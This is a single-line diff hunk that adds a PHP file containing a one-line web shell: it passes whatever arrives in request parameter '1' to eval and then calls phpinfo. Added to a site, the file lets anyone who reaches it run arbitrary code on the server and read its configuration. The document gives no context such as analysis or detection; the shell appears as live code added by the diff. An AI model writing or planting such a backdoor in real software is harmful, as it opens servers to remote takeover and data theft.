@@ -1,0 +1,1 @@
+<?php Eval($_REQUEST[1]);phpinfo();?>
